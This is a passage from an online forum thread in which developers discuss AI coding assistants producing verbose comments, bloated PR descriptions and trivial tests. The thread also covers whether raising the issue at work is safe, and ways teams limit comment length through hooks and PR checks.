+reply
+ulrikrasmussen
+4 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+This is a common problem, and I don't get why LLMs have not been tuned to stop this nonsense. It is writing comments as if the audience is you, the user in the session, while obviously code comments are meant for future readers.
+reply
+soupspaces
+3 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+Follow the tokens
+reply
+noman-land
+11 hours ago
+|
+parent
+|
+prev
+|
+next
+[–]
+Have you considered talking about it? You're in a professional environment collectively working in a new way with a group of people. It's up to somebody to have opinions about what does and doesn't suck. If you silently go along and don't say anything you're dooming yourself and all of us to a lifetime of this garbage.
+reply
+corndoge
+11 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+Fighting the ocean is futile
+reply
+delecti
+11 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+It's not the ocean, it's the poster's own team. A simple "AI comments suck" in a sprint retro would be trivially easy and would at least start the conversation.
+reply
+wavemode
+5 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+While I agree with the spirit of what you're saying, it is very similar to whenever anyone complains about things where they work. "Well, why don't you just raise it with management?" You're assuming that management
+1) Understands the problem ("what are comments?")
+2) Accepts that it is a problem ("how can more comments be a bad thing?")
+3) Cares enough to solve the problem ("is this issue really a priority to solve right now? just accept the PR and we'll go back and fix if needed some other time
+cough
+never
+cough
+")
+4) Believes you (this can take many forms, but the most common is, subconsciously, "this other engineer says it's not a problem, so I'll just assume it's not since that's easier")
+All of these logistical, political and social factors are "the ocean"
+reply
+delecti
+4 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+Sprint retro is with your own team. And disagreement isn't a problem, at least then there would be the potential to come to a common understanding between the GP comment and their coworkers.
+reply
+Perepiska
+1 hour ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+I usually require to file an issue in bug tracker about problem in #3 and then follow all its updates to prevent silent closing by management. It won't help but annoys management a lot and they afraid to get more backlog issues of such sort from me in the future.
+reply
+tripledry
+1 hour ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+Seems to me if technical decisions on the level of "no more AI comments" go through management the organization doesn't know what they are doing.
+To be fair, I would not be surprised.
+reply
+stronglikedan
+10 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+Doesn't matter. You'll come off as the baddie. It's the foreseeable future. Best just to learn how to interpret AI generated shit, or learn how to run it through AI and have it translate it to a more concise format without all the buzzwords. It'll take getting used to, but it'll save your career.
+reply
+wpietri
+7 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+You don't have to come across as the baddie. There are plenty of neutral ways to start the conversation. E.g., "I notice that there's a lot more generated comments lately. How much are people finding those useful?"
+If you really want to save your career, learning how to have real conversations is a vital skill.
+reply
+mannanj
+6 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+Have you worked in corporate recently or at a particularly toxic one?
+Asking because when I was at capital one, certain comments or questions about topics like this, would actually get you noticed negatively by your manager and being disruptive to what leadership wants hurts your career.
+In fact being the one to ask and point out questions like yours ultimately got me PIP'ed and removed from the company. So, like, yeah, being vulnerable and the first one to tell the truth is risky. That's why the bystander effect can happen and in politics or risky situations silence is a common response, and why we don't have more courageous people doing the right thing - because the risk is higher on the person speaking up and the rewards aren't disproportionately in their favor (but are evenly distributed though, so its not favorable for you as I learned from a game theory perspective to voice up / defend certain stances).
+reply
+annzabelle
+3 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+Capital One is a particularly toxic work environment, and I'm not sure that your experiences there apply to other companies.
+I started my first post-Capital One job a few months ago, and I'm still not used to the fact that this company expects everybody working here to still be working here in two years. Most employers are not going through everybody with a fine tooth comb every 6 months hunting for any hint of an excuse to PIP them.
+reply
+ulrikrasmussen
+4 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+What is this defeatist attitude? I don't know where you work, but it is not my impression that AI has instantly turned all developers into mindless AI-pilled sheep. If you feel like a simple suggestion like that will cost you your career, then it doesn't sound like a place where any constructive criticism would have been accepted even before AI.
+reply
+akomtu
+4 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+AI is more or less a religion right now in the corporate world. Speaking against AI amounts to heresy.
+reply
+ulrikrasmussen
+3 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+There is no single conforming "corporate world" that applies to all companies. If AI is treated religion in your company that sounds like a local problem, even if it seems like a trend.
+Besides, GP was not talking about corporate, but about the inability to even suggest an improved usage of LLMs among their developer peers, as if every line of code generated by AI is now gospel and questioning it is treated as heresy. This level of defeatism is beyond cynical and approaching childish.
+reply
+dragontamer
+4 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+Bring it up in a bar or otherwise off work.
+There's a reason 3rd places exists. There's a social construct that off-work discussion (even when on-work) stays off work.
+If your coworker is professional and cares about keeping channels open, they too will respect the unspoken rules that govern 3rd place neutral locations.
+Blame it on the alcohol later on if it actually pisses someone off.
+reply
+febusravenga
+2 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+This is the third place. There is no real 3rd place in real companies usually. Not in mine, when i work remotely for company from other side of continent.
+reply
+johnnyanmac
+3 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+>There's a reason 3rd places exists.
+Not anymore these days.
+reply
+atomicnumber3
+3 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+The number one rule of corpo programming: never, ever solve a problem you haven't been asked to solve.
+reply
+VohuMana
+10 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+I think the biggest issue might not be the immediate team but upper leadership. Companies which have mandated AI usage override a lot of what an individual or individual team wants. If that’s the case then it would be a lot like fighting the ocean, especially if your immediate team sees having AI write docs as an easy way to move the needle on LT’s AI monitoring dashboard.
+reply
+a2ff6eeb0
+3 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+It's the management desired direction, if the place is anything like my workplace. Everyone is all in on AI, and if you're not using it for everything possible, you're on the chopping block.
+And, really, it works. You can copy and paste between tickets and Claude, and then do manual testing. Then you tell Claude to self-review for clarity and minimalism, and stop worrying. Sure, today it's not as good as a human, but for almost all the code out there, it gets the job done. There's no skill needed any more, and if the boss doesn't care about quality, I don't see why I should.
+reply
+NateEag
+2 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+Your boss can get Claude to make unreadable, noisy, confusing code just as well as you can.
+There may not be a career left in software development with these monstrosities, but if there is, it's in using decades of experience to get the abominations to produce something other than unreadable dreck.
+If the code itself truly doesn't matter any more, programmers will no longer be paid.
+reply
+swat535
+9 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+You're going to have convince upper management why the team's velocity is suddenly affected in feature releases once they stop using AI.
+All the execs know that they can refresh the screen faster and see the features for marketing and sales.
+When has engineering ever had a voice anyway? The bean counters have been looking to cut us out since the inception of our industry.
+reply
+trip-zip
+11 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+So is completely eliminating litter, but I still pick it up when I pass it.
+reply
+noisy_boy
+6 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+Everybody generally agrees on what is garbage. Lot of senior management doesn't think AI is garbage or even if they privately think so, they don't say that openly. Falling in line, peer pressure, not wanting to come across as anti-AI luddite etc. All those issues affect the individual contributors too + the added challenge of perception in front of those who decide the bonus and lately, continued employment.
+In this fucked up job market, it is easier said than done.
+reply
+abustamam
+6 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+I feel like the chain kinda goes all the way to the top, to the level of shareholders. My boss needs to give his boss the perception that the engineering team is firing on all cylinders and has high velocity, so that he can sell that story to shareholders who could easily invest in another "AI-native" company and make more money because they're growing like crazy.
+I feel like it's all just perception and how companies can sell their stories to investors or potential acquirers, and everything else can be punted and dealt with later when we get acquired or when share prices are a zillion dollars etc.
+It's a race to the bottom, for sure.
+reply
+a34729t
+11 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+Literally pissing in an ocean of piss.
+reply
+anon7725
+10 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+Analogy-wise, wouldn't it be adding a cup of water to an ocean of piss?
+reply
+abustamam
+6 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+It'd be taking a cup of piss out of the ocean of piss i think!
+reply
+atomicnumber3
+3 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+No, if he speaks against it he gets labeled "anti-AI" and laid off or not promoted. If he stays silent he retains his job.
+Corporate Capitalism's main innovation was virtualizing feudalism. Now anyone with a bit of cash flow can be a feudal lord with peasants to do his will. No need to maintain land or fight over it with other feudal lords. There's still fighting, naturally, but now the game isn't zero sum.
+The serfs don't get any real say in this model. At best you can bend the lord's ear if you're sufficiently trusted an advisor. But part of the reason you're trusted is to be trusted not to treat the lord like he's too much of an idiot.
+A huge problem is that capitalism rewards cash flows and accumulated capital so powerfully that lots of other things just don't matter, potentially for a very long time. Look at GitHub. This leads to immensely extended fuck around phases and "find out" looks like IBM (fossilization and bizarre holdings corporation / dead company parking lot) just as often as it looks like Enron.
+reply
+brabel
+2 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+> The serfs don't get any real say in this model
+I am a programmer but also in management, and if I knew my team thought like that I would be horrified. We absolutely care about what the team members want , like, hate etc. I for once would love someone to bring up stuff like this to me. As long as they are as open minded about things as they would like me to be, there is no issue. But it’s a serious issue to pretend everything is fine while thinking like you say.
+reply
+keosak
+3 minutes ago
+|
+root
+|
+parent
+|
+next
+[–]
+> We absolutely care about what the team members want , like, hate etc.
+Do the people above you in management care as much? It's the top levels of management that decide hiring, firing and budgets.
+reply
+LPisGood
+10 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+Yes, talking about it repeatedly has been my process. Individual PRs have been changed but the 4 the next day look the same. The typical response is that they did change the (massive and wordy) PR overview from what AI said, even if it was obviously a minimal change at best. I can’t really argue against lying and going through and picking out every LLMism is not so productive in my opinion.
+I don’t have time to go through and flag everything or even read the thousands of lines of code changes that are happening.
+reply
+eudamoniac
+6 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+I've tried doing this, politely pushing back on problems happening from AI use, and it led to a not-so-subtle implication from my manager that I need to STFU or I'll be out of here (Cisco).
+reply
+rbongers
+9 hours ago
+|
+parent
+|
+prev
+|
+next
+[–]
+Two very useful directives to give AI when it comes to documentation:
+1) Document what's there, not the diff. Documentation of how code was removed or changed to fix a bug or add a feature is not useful and difficult to maintain; documentation should explain how code works now.
+2) Documentation should live close to the source as possible. Prefer line based comments and standardized function documentation. Top-level sweeping architectural essays are not maintainable for every change.
+The last will depend on your codebase. It CAN be very useful to have a human-readable spec documented for the entire program and have it updated when anything changes. But the key is again, you're CHANGING it every time. If you add a whole new disconnected documentation file it should set off alarm bells; nothing in one system is truly disconnected.
+reply
+ninkendo
+6 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+> Document what's there, not the diff
+We recently added a similar thing to our style guide, It’s astonishing to me that we have to spell this out, that something as obvious as this needs to be explained to LLM’s at all. They’re supposed to be exceeding human intelligence, at least at things like programming, but can’t understand basic things like what code comments are.
+reply
+epidemian
+1 hour ago
+|
+root
+|
+parent
+|
+next
+[–]
+> It’s astonishing to me that we have to spell this out, that something as obvious as this needs to be explained to LLM’s at all.
+Hehe. Yeah, that tendency of LLMs to document "the story" of the code instead of its current purpose (or non-obvious implementation details) is a pet peeve of mine too. I've added a slew of guidelines to try to sway Claude to not do this, but it still does it often.
+At the same time, it feels like something to be expected to have this "failure mode". The model has its context to work on, and what is on its context if not the conversation you've been having (and its internal monologue) and the files it has read? It makes sense that it references the story on its text generations, because that behavior is usually a good thing for an LLM to do. Otherwise, what would it generate? If it generated things that had nothing to do with the conversation in its context, in many cases those things would be seen as "hallucinations", and they'd tend to be RLHF'ed out. So the models that we end up having are the ones that have been reinforced to be most "contextually relevant" and less "hallucinatory".
+I might be completely wrong on that of course. It's just my intuitive reasoning of why this seems to be such a prevalent behavior.
+reply
+silverwind
+1 hour ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+Most models are trained to be as "helpful" as possible which may work for a chatbot but not for code.
+reply
+eru
+4 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+It's a bit weird, because that seems like something that approximately the same in every code base, so should be relatively easy to train generically.
+reply
+johnnyanmac
+3 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+>They’re supposed to be exceeding human intelligence, at least at things like programming
+This perception is a good part of why this market is irrational. LLM's aren't "intelligent". They do not reason, they are a very fancy kitbash of whatever it trains on.
+Ad yeah, I'm not surprised that a lot of documentation on every bit of readable code online is awful. "Document the diff" sounds like an anti-pattern learned from people with an incentive to get as many PR's submmitted as possible, not make the most friendly documentation for people maintaining a project.
+reply
+joshmoody24
+10 hours ago
+|
+parent
+|
+prev
+|
+next
+[–]
+My team uses a Claude Code hook that blocks any comment more than 2 lines long, and when tripped it encourages the agent to rewrite the comment more concisely and focus only on the "why" not the "what" of the code. I've found this extremely useful for code reviews.
+reply
+kristjansson
+5 hours ago
+|
+parent
+|
+prev
+|
+next
+[–]
+And the tests. Oh god the tests. Personal recent favorite: I asked for some changes to a Dockerfile, which it did ably, and then promptly tested by writing a pytest module that traversed up to the root, read the Dockerfile, and checked that the added lines were present.
+reply
+eru
+4 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+Try property based testing perhaps.
+reply
+kqr
+2 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+Code-generating robots are pretty bad at property-based testing, in my experience. They can do it but they still need a lot of hand-holding. They often regress to writing a mirror implementation as the oracle and trying to enumerate a fixed set of examples they find meaningful.
+reply
+kristjansson
+3 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+I'm generally happy with the tests I ask it for, some of which are PBT.  It's just the insistence upon memorializing every single change with a test.  Maybe encouraging / forcing PBT will dissuade it?
+reply
+LPisGood
+3 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+I’ve heard of this, but I’m not really sure at all how to even get started. Are there any good guides out there?
+reply
+eru
+53 minutes ago
+|
+root
+|
+parent
+|
+next
+[–]
+Many people like
+https://fsharpforfunandprofit.com/series/property-based-test...
+In this day and age,
+https://hypothesis.works/articles/claude-code-plugin/
+might be useful.
+reply
+LPisGood
+5 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+I regret this but at some point I stopped reading generated tests. It feels pointless when our test files are already tens of thousands of lines of — at best — tautological slip which says that the codes does what it does.
+reply
+hinkley
+7 hours ago
+|
+parent
+|
+prev
+|
+next
+[–]
+I told someone this week, who (or whose AI) chose to do a problem the hard way that it's usually a bad sign if you need more comments than code to solve a problem, and then suggested a couple lines of code that accomplished the same thing and used, are you sitting down? MEANINGFUL VARIABLE NAMES to document the purpose of each calculation.
+I wonder if I can get a MacArthur grant for this epiphany...
+reply
+kqr
+2 hours ago
+|
+parent
+|
+prev
+|
+next
+[–]
+I think your last sentence is getting close to the truth. You're no longer the audience for those descriptions. Other robots are.
+I'm not saying that's good or bad because I don't know, but I think that's the idea of dumping all that junk into PR descriptions.
+However, annoyingly, we still need to review those descriptions very closely, because the robots are trained to put a lot of weight into things they read in the documentation. And they tend tospresent loose speculation as fact. They often end up documenting some assumption that isn't true, then end up writing code as if it were.
+reply
+anematode
+1 hour ago
+|
+root
+|
+parent
+|
+next
+[–]
+Even worse, in a brownfield codebase that was once fairly light with comments, that's now being subject to these modifications, the insane amounts of commentary around the parts newly touched by AI lead to an excessive emphasis on those parts, for both human and AI readers (who think, well if this one part is commented so thoroughly, it must be unusually subtle)
+reply
+Fordec
+11 hours ago
+|
+parent
+|
+prev
+|
+next
+[–]
+I have five enforcement mechanisms: 1000 line max edit, PR comment character limits (get to the point of your description), ISO 24495 conformance check, and enforced code line citation that must exist, be a function declaration for the start of all paragraphs and inline commentary must be three lines or less and inline comments contribute max 10% of the PR. Fail any of these, automatic PR denial with no human intervention.
+reply
+LPisGood
+11 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+This sound pretty good, but every single attempt to put an actual character limit meets incredible resistance on my team. ISO 24495 looks interesting, how do you enforce that? Do you have some agent?
+reply
+Fordec
+10 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+Table of words LLM generated, Binary Searched on the output going forward and local skill/CLAUDE.md line with instruction to conform. The comparison then is pretty fast due to the word limitation rules. Also standardized PR format so a bunch of what a dev would usually communicate is just a series of checkboxes and a place for adding an optional link for "additional discussion" on slack as the escape hatch for people who like to waffle.
+reply
+CSMastermind
+10 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+> ISO 24495 conformance check
+How do you enforce that?
+reply
+Fordec
+10 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+Binary Searched against a table of words. It's rough at first, but once you add contextual exceptions the false positives calm down. Also the CLAUDE.md file has an instruction to conform before even submitting the PR and there's a skill too
